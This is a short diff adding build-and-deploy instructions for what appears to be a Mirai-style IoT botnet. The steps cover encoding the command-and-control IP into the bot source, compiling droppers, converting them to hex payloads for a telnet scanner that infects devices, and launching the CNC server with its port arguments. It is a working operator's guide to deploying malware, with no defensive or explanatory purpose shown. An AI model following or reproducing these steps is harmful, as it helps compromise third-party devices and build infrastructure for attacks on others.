@@ -1,0 +1,13 @@
+1. ./build.sh debug
+2. cd into debug folder. do "./enc (IP)" without partntheses 
+3. copy output to "bot_host" inside main. and tel.c
+4. compile dlrs
+5. copy droppers.txt into telnet scanner where the hex is.
+6. cd into debug folder, "./conv (path to dlr.bin)"
+7. copy hex into "payloads" inside telnet scanner
+8. take num of chars in hex, divide by 4. that is the number at the end of each hex line
+example: 
+ BIT_32, ENDIAN_LITTLE, EM_ARM , "HEX HERE", SIZE OF HEX / 4,
+9. ./build.sh release. 
+10. compile cnc
+cnc args: ./cnc BOTPORT threads CNCPORT
